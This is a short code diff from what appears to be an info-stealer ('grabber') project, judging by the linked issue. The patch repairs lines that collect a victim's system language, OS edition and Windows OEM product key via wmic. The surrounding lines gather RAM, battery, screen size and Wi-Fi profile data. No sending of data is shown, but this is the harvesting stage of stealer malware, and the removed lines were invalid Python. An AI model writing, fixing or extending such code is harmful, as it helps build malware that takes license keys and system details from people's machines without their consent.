@@ -67,10 +67,10 @@ if iface:
             # For some reason this may result in an error (https://github.com/DamagingRose/Rose-Grabber/issues/167)
             # pywifi/profile.py already initializes an SSID variable, so why this happens in unknown.
 
-lang = if subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1] is not None else "No System Language"
-system = if str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]) is not None else "No System Edition"
+lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
+system = str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1])
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
-product_key = str(output.split('\n', 1)[-1].strip()) if output is not None else "No license"
+product_key = str(output.split('\n', 1)[-1].strip())
 ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
 power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
 screen = f"{pyautogui.size()[0]}x{pyautogui.size()[1]}"
